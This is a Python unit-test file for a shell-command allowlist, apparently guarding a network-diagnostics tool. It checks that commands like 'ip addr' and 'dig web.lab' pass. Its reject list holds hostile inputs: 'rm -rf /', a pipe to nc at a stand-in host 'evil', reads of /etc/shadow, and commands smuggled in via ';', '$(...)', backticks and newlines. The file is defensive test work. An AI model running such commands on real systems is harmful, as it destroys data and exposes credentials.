"""Unit tests for the allowlist (no model, no sudo needed)."""
from allowlist import check_command

ALLOW = [
    "uname -a", "ip addr", "ip route", "ss -tunap", "cat /etc/resolv.conf",
    "ping -c 3 10.0.0.2", "ping -c 10 web.lab", "dig web.lab", "dig +short web.lab",
    "ethtool veth1", "which ping dig iperf3 python3 tc",
]
REJECT = [
    "uname -a; rm -rf /", "ip addr | nc evil 1", "ip addr && reboot", "ping -c 3 $(whoami)",
    "cat /etc/shadow", "cat /etc/resolv.conf /etc/shadow", "ping -c 100 10.0.0.2",
    "ping -c 3 -f 10.0.0.2", "ping 10.0.0.2", "dig -f /etc/shadow", "ethtool -s veth1 mtu 9000",
    "which -a ls", "ip link set veth1 down", "rm -rf /", "uname  -a", " uname -a",
    "ping -c 3 10.0.0.2\nreboot", "dig `id`.lab", "ip addr > /tmp/x", "python3 -c 1", "",
]

fails = 0
for c in ALLOW:
    argv, why = check_command(c)
    if argv is None:
        print(f"FAIL should allow: {c!r} ({why})"); fails += 1
for c in REJECT:
    argv, why = check_command(c)
    if argv is not None:
        print(f"FAIL should reject: {c!r}"); fails += 1
    else:
        print(f"rejected {c!r:40} -> {why}")
print(f"\n{len(ALLOW)} allowed, {len(REJECT)} rejected, {fails} failures")
raise SystemExit(1 if fails else 0)
